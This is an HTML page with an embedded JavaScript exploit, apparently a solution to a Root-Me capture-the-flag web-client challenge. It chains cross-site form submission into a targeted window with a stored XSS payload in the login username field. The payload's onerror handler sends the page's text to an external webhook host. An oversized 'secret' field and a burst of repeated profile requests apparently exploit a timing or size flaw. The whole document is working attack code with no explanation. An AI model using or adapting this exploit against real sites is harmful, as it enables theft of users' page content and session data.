<!doctype html>
<html>
<body>
<script>
const CHALL = "https://web-client-ch6.challenge01.root-me.org:58006";
const WEBHOOK = "https://zealous-bird-85.webhook.cool";

const xss = `<img src=x onerror="location='${WEBHOOK}/?d='+encodeURIComponent(document.body.innerText)">`;

if (!window.opener) {
  location.href = CHALL + "/login";
}

window.opener.name = "victim";

const f1 = document.createElement("form");
f1.method = "POST";
f1.action = CHALL + "/login";
f1.target = "victim";

const u = document.createElement("input");
u.name = "username";
u.value = xss;
f1.appendChild(u);

const s = document.createElement("input");
s.name = "secret";
s.value = "A".repeat(800000);
f1.appendChild(s);

document.body.appendChild(f1);

const f2 = document.createElement("form");
f2.method = "GET";
f2.action = CHALL + "/profile";
f2.target = "victim";
document.body.appendChild(f2);

setTimeout(() => f1.submit(), 20);
for (let i = 0; i < 25; i++) {
  setTimeout(() => f2.submit(), 30 + i * 15);
}
</script>
</body>
</html>
